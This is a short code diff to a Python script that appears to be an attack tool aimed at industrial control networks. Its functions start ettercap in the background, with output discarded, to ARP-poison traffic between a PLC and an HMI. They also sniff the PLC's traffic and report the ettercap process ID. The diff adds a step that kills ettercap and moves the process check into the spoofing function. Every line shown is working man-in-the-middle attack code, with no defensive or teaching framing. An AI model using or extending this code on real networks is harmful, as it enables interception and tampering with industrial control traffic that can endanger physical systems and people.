@@ -48,16 +48,18 @@ def psniff(plcip):
 def get_ip():
         scan()
         arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
-        process = os.popen('pgrep -f ettercap')
-        out = process.read()
-        process.close()
-        print("ettercap is running, PID : {}".format(out))
         os.system(arp1)
         psniff(plc_ip)
+        os.system('pkill -f ettercap')
+        sleep(1)
 
 def arp_spoofing():
         arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /{plc}// /{hmi}// >/dev/null 2>&1 &'.format(plc=plc_ip, hmi=hmi_ip)
         os.system(arp2)
+        process = os.popen('pgrep -f ettercap')
+        out = process.read()
+        process.close()
+        print("ettercap is running, PID : {}".format(out))
         print("ARP Poisoning start !!")
         sleep(4)
 
